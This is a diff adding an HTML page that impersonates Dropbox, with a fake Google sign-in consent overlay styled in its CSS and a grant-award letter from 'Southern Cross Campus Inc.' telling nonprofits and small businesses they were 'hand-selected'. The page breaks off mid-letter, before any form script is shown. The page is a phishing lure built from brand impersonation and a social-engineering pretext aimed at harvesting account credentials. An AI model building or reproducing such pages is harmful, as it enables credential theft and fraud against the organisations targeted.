@@ -1,0 +1,1539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in – Dropbox · Grant Award Documents | SCC-9303485-27</title>
+    <link rel="icon" href="https://thumb.wikimedia.org/wikipedia/commons/thumb/7/78/Dropbox_Icon.svg/1280px-Dropbox_Icon.svg.png" type="image/png" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+    <style>
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --db-blue: #0061ff;
+            --db-blue-dark: #004ad6;
+            --db-blue-light: #e0ebff;
+            --db-bg: #f4f5f7;
+            --db-white: #ffffff;
+            --db-border: #e0e4ea;
+            --db-text: #1a2233;
+            --db-text-secondary: #536171;
+            --db-text-muted: #97a2b0;
+            --db-radius: 12px;
+            --db-radius-sm: 8px;
+            --db-radius-lg: 16px;
+            --db-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            --db-shadow-lg: 0 24px 80px rgba(0, 0, 0, 0.12);
+            --db-font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            --sidebar-width: 264px;
+            --topbar-height: 58px;
+            --card-bg: rgba(255, 255, 255, 0.72);
+            --card-border: rgba(255, 255, 255, 0.3);
+            --glass-bg: rgba(255, 255, 255, 0.65);
+            --glass-border: rgba(255, 255, 255, 0.25);
+            --modal-overlay: rgba(26, 34, 51, 0.55);
+            --success-bg: #e6f4ea;
+            --success-text: #137333;
+            --shared-bg: #e8f0fe;
+            --shared-text: #1a73e8;
+            --scrollbar-track: #f0f2f5;
+            --scrollbar-thumb: #c5ccd6;
+            --folder-icon: #f59e0b;
+            --file-row-hover: #f8f9fb;
+            --file-row-border: #f0f2f5;
+            --search-bg: #f0f2f5;
+            --nav-hover: #f0f2f5;
+            --input-bg: #ffffff;
+            --input-border: #e0e4ea;
+            --input-focus-ring: rgba(0, 97, 255, 0.1);
+            --error-color: #d32f2f;
+            --error-ring: rgba(211, 47, 47, 0.08);
+            --consent-bg: #ffffff;
+            --consent-border: #e8eaed;
+            --consent-account-bg: #f8f9fa;
+            --consent-account-border: #dadce0;
+            --consent-trust-bg: #f0f6ff;
+            --consent-trust-border: #d2e3fc;
+            --badge-text: #1a2233;
+            --shimmer-colors: #0061ff, #3b82f6, #60a5fa, #0061ff;
+        }
+
+        html {
+            font-size: 16px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            font-family: var(--db-font);
+            background: var(--db-bg);
+            min-height: 100vh;
+            color: var(--db-text);
+            line-height: 1.5;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--scrollbar-track);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--scrollbar-thumb);
+            border-radius: 3px;
+        }
+
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: var(--sidebar-width);
+            height: 100vh;
+            background: var(--card-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-right: 1px solid var(--card-border);
+            padding: 22px 16px 18px;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            user-select: none;
+        }
+
+        .sidebar .brand {
+            display: flex;
+            align-items: center;
+            gap: 11px;
+            padding: 0 12px 0 8px;
+            margin-bottom: 30px;
+            height: 40px;
+        }
+
+        .sidebar .brand img {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+            filter: drop-shadow(0 1px 2px rgba(0, 97, 255, 0.1));
+        }
+
+        .sidebar .brand span {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--db-text);
+            letter-spacing: -0.02em;
+        }
+
+        .sidebar nav {
+            flex: 1;
+            overflow-y: auto;
+            padding: 0 4px;
+        }
+
+        .sidebar nav a {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 12px;
+            border-radius: var(--db-radius-sm);
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--db-text-secondary);
+            text-decoration: none;
+            margin-bottom: 2px;
+            transition: background 0.15s, color 0.15s;
+        }
+
+        .sidebar nav a:hover {
+            background: var(--nav-hover);
+            color: var(--db-text);
+        }
+
+        .sidebar nav a svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+            flex-shrink: 0;
+            opacity: 0.7;
+        }
+
+        .sidebar nav a.active {
+            background: var(--db-blue-light);
+            color: var(--db-blue);
+            font-weight: 600;
+        }
+
+        .sidebar nav a.active svg {
+            opacity: 1;
+        }
+
+        .sidebar .divider {
+            height: 1px;
+            background: var(--db-border);
+            margin: 10px 12px;
+        }
+
+        .sidebar .storage {
+            padding: 14px 12px 4px;
+            border-top: 1px solid var(--db-border);
+            margin-top: auto;
+        }
+
+        .sidebar .storage .bar {
+            width: 100%;
+            height: 4px;
+            background: #e8ebef;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 8px;
+        }
+
+        .sidebar .storage .bar .fill {
+            height: 100%;
+            width: 18%;
+            background: linear-gradient(90deg, var(--db-blue), #3b82f6);
+            border-radius: 4px;
+        }
+
+        .sidebar .storage .label {
+            font-size: 11px;
+            color: var(--db-text-muted);
+        }
+
+        .sidebar .storage .label span {
+            float: right;
+        }
+
+        .main {
+            margin-left: var(--sidebar-width);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .topbar {
+            height: var(--topbar-height);
+            background: var(--glass-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--glass-border);
+            display: flex;
+            align-items: center;
+            padding: 0 28px;
+            gap: 14px;
+            flex-shrink: 0;
+            position: sticky;
+            top: 0;
+            z-index: 5;
+        }
+
+        .topbar .breadcrumb {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            color: var(--db-text-muted);
+        }
+
+        .topbar .breadcrumb .sep {
+            opacity: 0.4;
+        }
+
+        .topbar .breadcrumb .current {
+            color: var(--db-text);
+            font-weight: 600;
+        }
+
+        .topbar .spacer {
+            flex: 1;
+        }
+
+        .topbar .search {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--search-bg);
+            border-radius: var(--db-radius-sm);
+            padding: 7px 12px;
+            width: 220px;
+            transition: background 0.15s, box-shadow 0.15s;
+        }
+
+        .topbar .search:focus-within {
+            background: var(--input-bg);
+            box-shadow: 0 0 0 2px var(--db-blue);
+        }
+
+        .topbar .search svg {
+            width: 16px;
+            height: 16px;
+            fill: var(--db-text-muted);
+            flex-shrink: 0;
+        }
+
+        .topbar .search input {
+            border: none;
+            background: transparent;
+            outline: none;
+            font-size: 13px;
+            color: var(--db-text);
+            font-family: inherit;
+            width: 100%;
+        }
+
+        .topbar .search input::placeholder {
+            color: var(--db-text-muted);
+        }
+
+        .topbar .icon-btn {
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            transition: background 0.12s;
+            color: var(--db-text-secondary);
+            position: relative;
+        }
+
+        .topbar .icon-btn:hover {
+            background: var(--nav-hover);
+        }
+
+        .topbar .icon-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        .topbar .icon-btn .badge {
+            position: absolute;
+            top: 4px;
+            right: 4px;
+            width: 8px;
+            height: 8px;
+            background: #ef4444;
+            border-radius: 50%;
+            border: 2px solid var(--glass-bg);
+        }
+
+        .topbar .profile {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: none;
+            background: transparent;
+            font-family: inherit;
+            padding: 4px 10px 4px 4px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.12s;
+        }
+
+        .topbar .profile:hover {
+            background: var(--nav-hover);
+        }
+
+        .topbar .profile .avatar {
+            width: 30px;
+            height: 30px;
+            background: linear-gradient(135deg, var(--db-blue), #3b82f6);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .topbar .profile .name {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--db-text);
+        }
+
+        .files {
+            flex: 1;
+            padding: 30px 40px 44px;
+            overflow-y: auto;
+        }
+
+        .files .page-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--db-text);
+            letter-spacing: -0.03em;
+            margin-bottom: 2px;
+        }
+
+        .files .page-title .grant-highlight {
+            color: var(--db-blue);
+        }
+
+        .files .page-sub {
+            font-size: 13px;
+            color: var(--db-text-muted);
+            margin-bottom: 30px;
+        }
+
+        .folder {
+            margin-bottom: 30px;
+        }
+
+        .folder .head {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 0 10px;
+            border-bottom: 1px solid var(--db-border);
+            margin-bottom: 2px;
+        }
+
+        .folder .head svg {
+            width: 18px;
+            height: 18px;
+            fill: var(--folder-icon);
+            flex-shrink: 0;
+        }
+
+        .folder .head span {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--db-text);
+        }
+
+        .folder .head .count {
+            margin-left: auto;
+            font-size: 12px;
+            color: var(--db-text-muted);
+        }
+
+        .file-row {
+            display: flex;
+            align-items: center;
+            padding: 11px 14px;
+            border-radius: var(--db-radius-sm);
+            gap: 14px;
+            transition: background 0.1s;
+            cursor: default;
+            border-bottom: 1px solid var(--file-row-border);
+        }
+
+        .file-row:last-child {
+            border-bottom: none;
+        }
+
+        .file-row:hover {
+            background: var(--file-row-hover);
+        }
+
+        .file-row .icon {
+            width: 36px;
+            height: 44px;
+            background: var(--db-blue-light);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 8px;
+            font-weight: 800;
+            color: var(--db-blue);
+            border: 1px solid #c6d9fc;
+        }
+
+        .file-row .info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .file-row .info .name {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--db-text);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .file-row .info .meta {
+            font-size: 12px;
+            color: var(--db-text-muted);
+            margin-top: 1px;
+        }
+
+        .file-row .size {
+            font-size: 12px;
+            color: var(--db-text-muted);
+            white-space: nowrap;
+            min-width: 56px;
+            text-align: right;
+        }
+
+        .file-row .status {
+            font-size: 11px;
+            font-weight: 500;
+            padding: 2px 10px;
+            border-radius: 12px;
+            white-space: nowrap;
+        }
+
+        .file-row .status.ready {
+            color: var(--success-text);
+            background: var(--success-bg);
+        }
+
+        .file-row .status.shared {
+            color: var(--shared-text);
+            background: var(--shared-bg);
+        }
+
+        .file-row .more {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            flex-shrink: 0;
+            opacity: 0;
+            transition: opacity 0.1s, background 0.1s;
+            color: var(--db-text-secondary);
+        }
+
+        .file-row:hover .more {
+            opacity: 1;
+        }
+
+        .file-row .more:hover {
+            background: #e8ebef;
+        }
+
+        .file-row .more svg {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: var(--modal-overlay);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            z-index: 200;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            animation: fadeIn 0.25s ease;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .modal {
+            max-width: 444px;
+            width: 100%;
+            background: var(--consent-bg);
+            border-radius: var(--db-radius-lg);
+            box-shadow: var(--db-shadow-lg);
+            padding: 38px 38px 30px;
+            animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes slideUp {
+            0% { opacity: 0; transform: translateY(18px) scale(0.97); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .modal::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--shimmer-colors));
+            background-size: 300% 100%;
+            animation: shimmer 5s ease infinite;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .modal .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 26px;
+        }
+
+        .modal .brand img {
+            width: 42px;
+            height: 42px;
+            object-fit: contain;
+            filter: drop-shadow(0 2px 4px rgba(0, 97, 255, 0.1));
+        }
+
+        .modal .brand .text h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--db-text);
+            line-height: 1.2;
+        }
+
+        .modal .brand .text p {
+            font-size: 12px;
+            color: var(--db-text-muted);
+        }
+
+        .modal h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--db-text);
+            margin-bottom: 6px;
+            letter-spacing: -0.02em;
+        }
+
+        .modal .desc {
+            font-size: 14px;
+            color: var(--db-text-secondary);
+            line-height: 1.6;
+            margin-bottom: 26px;
+        }
+
+        .modal .field {
+            margin-bottom: 20px;
+        }
+
+        .modal .field label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--db-text-secondary);
+            margin-bottom: 6px;
+        }
+
+        .modal .field input {
+            width: 100%;
+            padding: 13px 16px;
+            font-size: 15px;
+            font-family: inherit;
+            color: var(--db-text);
+            background: var(--input-bg);
+            border: 1.5px solid var(--input-border);
+            border-radius: var(--db-radius-sm);
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .modal .field input:focus {
+            border-color: var(--db-blue);
+            box-shadow: 0 0 0 4px var(--input-focus-ring);
+        }
+
+        .modal .field input::placeholder {
+            color: #b5beca;
+        }
+
+        .modal .field .error {
+            display: none;
+            font-size: 12px;
+            color: var(--error-color);
+            margin-top: 5px;
+            font-weight: 500;
+        }
+
+        .modal .field .error.show {
+            display: block;
+        }
+
+        .modal .field input.error-border {
+            border-color: var(--error-color);
+            box-shadow: 0 0 0 4px var(--error-ring);
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-6px); }
+            40% { transform: translateX(6px); }
+            60% { transform: translateX(-4px); }
+            80% { transform: translateX(4px); }
+        }
+
+        .modal .google-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 14px 16px;
+            background: var(--input-bg);
+            border: 1.5px solid var(--input-border);
+            border-radius: var(--db-radius-sm);
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--db-text);
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.12s, border-color 0.12s, box-shadow 0.12s;
+            margin-bottom: 18px;
+        }
+
+        .modal .google-btn:hover {
+            background: #f8f9fb;
+            border-color: #c5ccd6;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.04);
+        }
+
+        .modal .google-btn:active {
+            transform: scale(0.97);
+        }
+
+        .modal .google-btn .g-logo {
+            width: 22px;
+            height: 22px;
+            flex-shrink: 0;
+        }
+
+        .modal .google-btn .g-logo svg {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+
+        .modal .footer {
+            text-align: center;
+            font-size: 12px;
+            color: var(--db-text-muted);
+            line-height: 1.7;
+        }
+
+        .modal .footer a {
+            color: var(--db-blue);
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .modal .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .consent-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 300;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        .consent-overlay.show {
+            display: flex;
+        }
+
+        .consent-card {
+            max-width: 424px;
+            width: 100%;
+            background: var(--consent-bg);
+            border-radius: 18px;
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.25);
+            padding: 34px 30px 26px;
+            animation: consentIn 0.45s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes consentIn {
+            0% { opacity: 0; transform: scale(0.9) translateY(14px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .consent-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #4285F4, #34A853, #FBBC05, #EA4335);
+            background-size: 300% 100%;
+            animation: shimmer 3s ease infinite;
+        }
+
+        .consent-card .g-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid var(--consent-border);
+            position: relative;
+            z-index: 1;
+        }
+
+        .consent-card .g-logo svg {
+            width: 34px;
+            height: 34px;
+            flex-shrink: 0;
+        }
+
+        .consent-card .g-logo span {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1f1f1f;
+            letter-spacing: -0.01em;
+        }
+
+        .consent-card .g-title {
+            font-size: 19px;
+            font-weight: 600;
+            color: #1f1f1f;
+            margin-bottom: 4px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .consent-card .g-sub {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .consent-card .account-card {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: var(--consent-account-bg);
+            border: 1px solid var(--consent-account-border);
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-bottom: 18px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .consent-card .account-card .avatar {
+            width: 38px;
+            height: 38px;
+            background: linear-gradient(135deg, #1a73e8, #4285f4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .consent-card .account-card .details {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .consent-card .account-card .details .name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1f1f1f;
+        }
+
+        .consent-card .account-card .details .email {
+            font-size: 13px;
+            color: #5f6368;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .consent-card .account-card .check {
+            width: 20px;
+            height: 20px;
+            background: #1a73e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .consent-card .account-card .check svg {
+            width: 12px;
+            height: 12px;
+            fill: #ffffff;
+        }
+
+        .consent-card .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--consent-trust-bg);
+            border: 1px solid var(--consent-trust-border);
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-bottom: 18px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .consent-card .trust-badge svg {
+            width: 18px;
+            height: 18px;
+            fill: #1a73e8;
+            flex-shrink: 0;
+        }
+
+        .consent-card .trust-badge span {
+            font-size: 13px;
+            color: var(--badge-text);
+            font-weight: 500;
+        }
+
+        .consent-card .trust-badge span strong {
+            color: #1a73e8;
+        }
+
+        .consent-card .g-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-top: 16px;
+            border-top: 1px solid var(--consent-border);
+            position: relative;
+            z-index: 1;
+        }
+
+        .consent-card .g-actions .cancel {
+            flex: 1;
+            padding: 10px;
+            background: transparent;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #5f6368;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.12s;
+        }
+
+        .consent-card .g-actions .cancel:hover {
+            background: #f1f3f4;
+        }
+
+        .consent-card .g-footer {
+            font-size: 11px;
+            color: #9aa0a6;
+            text-align: center;
+            margin-top: 14px;
+            line-height: 1.6;
+            position: relative;
+            z-index: 1;
+        }
+
+        .consent-card .g-footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .consent-card .g-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .toast-container {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            z-index: 400;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            pointer-events: none;
+        }
+
+        .toast {
+            padding: 12px 20px;
+            border-radius: 10px;
+            background: var(--consent-bg);
+            border: 1px solid var(--consent-border);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
+            font-size: 13px;
+            color: var(--db-text);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: toastIn 0.4s cubic-bezier(0.16, 1, 0.3, 1), toastOut 0.3s ease forwards;
+            animation-duration: 0.4s, 0.3s;
+            animation-delay: 0s, 2.5s;
+            pointer-events: auto;
+            backdrop-filter: blur(12px);
+        }
+
+        @keyframes toastIn {
+            0% { opacity: 0;
+            transform: translateY(16px) scale(0.95); }
+            100% { opacity: 1;
+            transform: translateY(0) scale(1); }
+        }
+
+        @keyframes toastOut {
+            0% { opacity: 1;
+            transform: translateY(0) scale(1); }
+            100% { opacity: 0;
+            transform: translateY(12px) scale(0.95); }
+        }
+
+        .toast .toast-icon {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+            fill: var(--db-blue);
+        }
+
+        @media (max-width: 900px) {
+            .sidebar { width: 60px; padding: 16px 8px; }
+            .sidebar .brand span, .sidebar nav a span, .sidebar .storage .label { display: none; }
+            .sidebar nav a { justify-content: center; padding: 10px; }
+            .sidebar .storage .bar { width: 28px; margin: 0 auto 8px; }
+            .sidebar .storage .label { text-align: center; }
+            .sidebar .storage .label span { float: none; }
+            .main { margin-left: 60px; }
+            .files { padding: 22px 20px 36px; }
+            .topbar .search { width: 140px; }
+        }
+
+        @media (max-width: 600px) {
+            .sidebar { display: none; }
+            .main { margin-left: 0; }
+            .topbar { padding: 0 14px; gap: 6px; height: 52px; }
+            .topbar .search { width: 100px; padding: 5px 8px; }
+            .topbar .profile .name { display: none; }
+            .files { padding: 16px 14px 30px; }
+            .files .page-title { font-size: 18px; }
+            .file-row { padding: 9px 10px; }
+            .file-row .status { font-size: 10px; padding: 1px 6px; }
+            .file-row .more { opacity: 1; }
+            .modal { padding: 30px 22px 24px; }
+            .modal h1 { font-size: 21px; }
+            .consent-card { padding: 26px 20px 22px; }
+            .consent-card .g-actions { flex-direction: column; }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
+        }
+    </style>
+</head>
+<body>
+
+    <aside class="sidebar">
+        <div class="brand">
+            <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/7/78/Dropbox_Icon.svg/1280px-Dropbox_Icon.svg.png" alt="Dropbox" />
+            <span>Dropbox</span>
+        </div>
+        <nav>
+            <a class="active" href="#">
+                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                <span>Home</span>
+            </a>
+            <a href="#">
+                <svg viewBox="0 0 24 24"><path d="M6 2h8l6 6v14H6V2zm7 1.5V8h4.5L13 3.5zM8 12h8v1.5H8V12zm0 3h6v1.5H8V15zm0 3h8v1.5H8V18z"/></svg>
+                <span>All Files</span>
+            </a>
+            <a href="#">
+                <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+                <span>Photos</span>
+            </a>
+            <a href="#">
+                <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
+                <span>Shared</span>
+            </a>
+            <a href="#">
+                <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>
+                <span>File Requests</span>
+            </a>
+            <a href="#">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                <span>Deleted Files</span>
+            </a>
+            <div class="divider"></div>
+            <a href="#">
+                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zM7 10h2v7H7v-7zm4-3h2v10h-2V7zm4 6h2v4h-2v-4z"/></svg>
+                <span>Insights</span>
+            </a>
+            <a href="#">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                <span>Passwords</span>
+            </a>
+        </nav>
+        <div class="storage">
+            <div class="bar">
+                <div class="fill"></div>
+            </div>
+            <div class="label">
+                1.8 GB of 10 GB used
+                <span>18%</span>
+            </div>
+        </div>
+    </aside>
+
+    <div class="main">
+        <header class="topbar">
+            <div class="breadcrumb">
+                Dropbox
+                <span class="sep">›</span>
+                <span class="current">Grant AWARD DOCUMENTS</span>
+            </div>
+            <div class="spacer"></div>
+            <div class="search">
+                <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+                <input type="text" placeholder="Search grants..." />
+            </div>
+            <button class="icon-btn" aria-label="Notifications">
+                <svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
+            </button>
+            <button class="profile">
+                <div class="avatar">P</div>
+                <span class="name">Patel</span>
+            </button>
+        </header>
+
+        <main class="files">
+            <div class="page-title">
+             <span class="grant-highlight">Grant</span> OUTLINE
+            </div>
+            <div class="page-sub">Confidential Shared with your team</div>
+
+            <!-- Grant Letter Section -->
+            <section class="folder">
+                <div class="head">
+                    <svg viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2z"/></svg>
+                    <span>📄 Grant Award Letter — Southern Cross Campus Inc.</span>
+                    <span class="count">1 document</span>
+                </div>
+                <div style="padding: 20px 24px; background: var(--db-white); border-radius: var(--db-radius-sm); margin-top: 4px; box-shadow: var(--db-shadow);">
+                    <p style="font-size: 14px; color: var(--db-text-secondary); line-height: 1.7; margin-bottom: 16px;">
+                        <strong style="color: var(--db-text); font-size: 16px;">Year-End Funding, Grants & Initiative | Nonprofit & Small Business Development</strong><br />
+                        <strong>Submission ID:</strong> SCC-9303485-27<br />
+                        <strong>Date:</strong> October 20, 2026
+                    </p>
+                    <hr style="border: none; border-top: 1px solid var(--db-border); margin: 16px 0;" />
+                    <p style="font-size: 14px; color: var(--db-text-secondary); line-height: 1.7; margin-bottom: 12px;">
+                        <strong style="color: var(--db-text);">Request Summary</strong>
+                    </p>
+                    <p style="font-size: 14px; color: var(--db-text-secondary); line-height: 1.7; margin-bottom: 12px;">
+                        Based on strong recommendations from our network of supporters, <strong>Southern Cross Campus Inc.</strong> is pleased to invite your organization to apply for our <strong>Business & Organization Development Grant</strong> — a targeted funding opportunity designed specifically for nonprofits and small businesses across the United States.
+                    </p>
+                    <p style="font-size: 14px; color: var(--db-text-secondary); line-height: 1.7; margin-bottom: 12px;">
+                        You have been hand-selected for this invitation. This is more than just another grant application — it is a genuine opportunity to strengthen your operations, expand your impact, and build a more sustainable future for the community you serve.
+                    </p>
+                    <p style="font-size: 14px; color: var(--db-text-secondary); line-height: 1.7; margin-bottom: 12px;">
+                        Whether you aim to launch a new program, upgrade your technology, hire key staff, or stabilize your budget heading into the new year, this grant is designed to help you get there.
+                    </p>
+                    <p style="font-size: 14px; color: var(--db-text-secondary); line-height: 1.7; margin-bottom: 16px;">
